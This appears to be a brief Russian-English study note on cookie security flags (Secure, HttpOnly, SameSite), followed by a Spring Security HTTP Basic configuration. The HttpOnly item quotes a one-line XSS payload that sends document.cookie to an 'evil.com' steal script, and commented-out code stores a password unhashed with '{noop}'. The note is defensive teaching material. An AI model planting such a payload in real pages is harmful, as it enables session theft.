- set cookie `Secure` (protects from man in the middle)
- `HttpOnly` недостуна из JavaScript. Защищает от атак `(new Image()).src = "http://evil.com/steal-cookie.php?cookie=" + document.cookie;`
- `SameSite=Strict`, нельзя посылать между разными доменами


```Java
    @Value("${spring.security.user.name}")
    private String username;

    @Value("${spring.security.user.password}")
    private String password;

    @Override
    public void configure(HttpSecurity http) throws Exception {
        http.authorizeRequests()
            .antMatchers("/**")
            .authenticated()
            .and().httpBasic(httpSecurityHttpBasicConfigurer -> {
                httpSecurityHttpBasicConfigurer.authenticationEntryPoint(new AuthExceptionEntryPoint());
            });
    }
// можно самим задать inMemoryAuth,
// можно проперти spring.security.user.name, spring.security.user.password прописать без этого закомментированного кода
//    @Autowired
//    public void configureGlobal(AuthenticationManagerBuilder auth) throws Exception {
//        auth.inMemoryAuthentication()
//            .withUser(username)
//            .password("{noop}" + password)
//            .authorities("ROLE_USER");
//    }
```
